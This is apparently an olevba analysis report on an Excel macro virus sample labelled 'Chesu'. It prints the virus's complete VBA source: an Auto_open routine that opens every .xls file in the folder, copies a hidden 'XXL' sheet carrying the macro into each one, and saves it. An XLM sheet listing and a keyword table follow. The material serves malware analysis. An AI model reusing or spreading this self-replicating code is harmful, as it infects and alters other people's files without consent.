olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Chesu-39fdf79655d082f2133f31a1ea7ddfde118b8270
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO XXL.bas 
in file: Virus.MSExcel.Chesu-39fdf79655d082f2133f31a1ea7ddfde118b8270 - OLE stream: '_VBA_PROJECT_CUR/VBA/XXL'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Name = "XXL"
Dim A, u_B As Object


Sub Auto_open()
Attribute Auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
  Application.StatusBar = "Viel Spaß bei der Arbeit !"
  SucheXLS
  Application.StatusBar = ""
End Sub


Function SucheMappe(MName As String) As Boolean
Attribute SucheMappe.VB_ProcData.VB_Invoke_Func = " \n14"
  Dim flag As Boolean
  Dim M As Object
  flag = False
  For Each M In Workbooks
    If M.Name = MName Then flag = True
  Next
  SucheMappe = flag
End Function


Sub KopiereSelbst(M As String)
Attribute KopiereSelbst.VB_ProcData.VB_Invoke_Func = " \n14"
  On Error GoTo KopiereEnde
  A.Sheets(Name).Visible = True
  A.Sheets(Name).Copy Before:=Workbooks(M).Sheets(1)
  Sheets(Name).Visible = xlVeryHidden
  A.Activate
  Sheets(Name).Visible = xlVeryHidden
KopiereEnde:
End Sub
 
 
Sub SucheXLS()
Attribute SucheXLS.VB_ProcData.VB_Invoke_Func = " \n14"
  Dim DName As String
  Application.ScreenUpdating = False
  On Error GoTo SucheEnde
  Set A = ActiveWorkbook
  Set u_B = A.ActiveSheet
  DName = Dir("*.xls", 0)
  While DName <> ""
    If SucheMappe(DName) = False Then
      Workbooks.Open Filename:=DName, UpdateLinks:=0
      If Sheets(1).Name <> Name Then
        KopiereSelbst DName
      End If
      Workbooks(DName).Close True
    End If
    DName = Dir()
  Wend
SucheEnde:
  Application.ScreenUpdating = True
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  XX
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
+----------+--------------------+---------------------------------------------+

